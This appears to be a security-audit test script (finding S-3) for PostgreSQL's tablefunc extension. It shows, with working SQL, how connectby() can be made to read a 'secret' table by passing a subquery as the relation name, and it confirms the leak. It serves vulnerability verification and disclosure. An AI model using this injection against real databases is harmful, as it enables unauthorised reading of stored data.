-- S-3: SQL Injection via Unquoted Identifiers in tablefunc.c connectby()
-- Severity: High
-- File: contrib/tablefunc/tablefunc.c, lines 1226-1244
--
-- connectby() interpolates relname, key_fld, parent_key_fld raw into SQL.
-- The SQL template is:
--   SELECT <key_fld>, <parent_key_fld> FROM <relname>
--     WHERE <parent_key_fld> = '<start_with>' AND <key_fld> IS NOT NULL
--     AND <key_fld> <> <parent_key_fld>
--
-- We inject a subquery as the relname that reads from an arbitrary table.
-- Key insight: we must NOT break the WHERE clause (no --), otherwise
-- connectby's recursion detection triggers infinite loop errors.
--
-- Prerequisites: CREATE EXTENSION tablefunc;

\echo '=== S-3: tablefunc connectby() SQL injection test ==='

DROP TABLE IF EXISTS s3_tree CASCADE;
DROP TABLE IF EXISTS s3_secret CASCADE;

CREATE TABLE s3_tree (
    keyid text PRIMARY KEY,
    parent_keyid text
);
INSERT INTO s3_tree VALUES ('1', NULL), ('2', '1'), ('3', '1');

CREATE TABLE s3_secret (
    id int PRIMARY KEY,
    secret_data text
);
INSERT INTO s3_secret VALUES (1, 'STOLEN_SECRET_12345');

\echo 'Test 1: Normal connectby...'
SELECT * FROM connectby('s3_tree', 'keyid', 'parent_keyid', '1', 2)
    AS t(keyid text, parent_keyid text, level int);

\echo ''
\echo 'Test 2: Subquery injection in relname to read from secret table...'

-- Inject a subquery as the relname that returns data from s3_secret.
-- The subquery returns one row: (secret_data, 'root')
-- start_with = 'root' matches the parent_keyid.
-- The WHERE clause remains intact so connectby doesn't infinitely recurse.
DO $$
DECLARE
    rec record;
    found_secret boolean := false;
BEGIN
    FOR rec IN
        SELECT * FROM connectby(
            '(SELECT secret_data AS keyid, ''root''::text AS parent_keyid FROM s3_secret) AS injected',
            'keyid', 'parent_keyid',
            'root',  -- matches the fabricated parent_keyid
            1
        ) AS t(keyid text, parent_keyid text, level int)
    LOOP
        RAISE NOTICE 'Row: keyid=%, parent=%, level=%', rec.keyid, rec.parent_keyid, rec.level;
        IF rec.keyid LIKE '%STOLEN_SECRET%' THEN
            found_secret := true;
        END IF;
    END LOOP;

    IF found_secret THEN
        RAISE NOTICE 'S-3 RESULT: *** VERIFIED *** - Secret data exfiltrated from s3_secret via relname injection!';
    ELSE
        RAISE NOTICE 'S-3 RESULT: Injection executed but secret not found';
    END IF;
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'S-3 Error: %', SQLERRM;
END;
$$;

-- Cleanup
DROP TABLE IF EXISTS s3_tree CASCADE;
DROP TABLE IF EXISTS s3_secret CASCADE;

\echo '=== S-3 test complete ==='
